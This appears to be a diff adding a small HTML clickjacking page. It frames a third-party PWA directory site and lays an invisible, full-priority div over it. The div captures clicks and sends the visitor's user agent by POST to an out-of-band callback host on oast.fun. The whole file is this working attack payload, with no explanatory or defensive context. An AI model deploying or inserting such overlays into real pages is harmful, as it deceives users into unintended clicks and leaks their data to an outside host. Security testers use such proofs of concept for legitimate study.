@@ -1,0 +1,12 @@
+<iframe src="https://pwa-directory.com" sandbox="allow-scripts allow-top-navigation" width="100%" height="400" style="border:none;"></iframe>
+<div onclick="installClick()" style="position:fixed;top:150px;left:50px;width:300px;height:100px;background:transparent;z-index:9999;"></div>
+
+<script>
+function installClick() {
+  fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/pwa-click', {
+    method: 'POST',
+    body: JSON.stringify({ clicked: true, ua: navigator.userAgent }),
+    headers: { 'Content-Type': 'application/json' }
+  });
+}
+</script>
